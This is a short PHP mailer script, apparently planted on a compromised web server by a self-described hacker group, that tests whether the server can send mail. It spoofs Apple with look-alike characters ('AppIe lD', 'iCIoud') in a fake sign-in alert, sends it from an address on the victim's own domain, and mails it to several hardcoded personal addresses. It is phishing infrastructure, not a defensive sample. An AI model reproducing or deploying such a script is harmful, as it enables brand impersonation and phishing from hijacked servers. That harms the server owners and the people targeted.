<body bgcolor="black"> 
<?php 
/* made by Raymond7 */ 
/* Garuda Security Hacker ! */ 
/* mailer.php */ 
$name = "AppIe"; $to = "simolala48@hotmail.com, elqesby@mail.com, simolala48@yahoo.com, elqe.abd@aol.com,"; $web="$_SERVER[HTTP_HOST]"; 
$subject = "Your AppIe lD was used to sign in to iCIoud via a web browser"; 
$body = ' 
<a href="https://wikipedia.org/">Tested Mail 1</a> 
<br> 
<a href="https://wikipedia.org/">Tested Mail 2</a> Kids Was Here '; 
$email = "AppIe@$web"; 
$headers = 'From: ' .
$email . "\r\n". 
$headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
if (mail($to,
$subject,
$body,
$headers,$name)) 
{ echo("<font color=lime>Email Sended To => $to </font>"); 
} else 
{ 
echo("<font color=red>Not Support For Mailer</font>"); } ?>
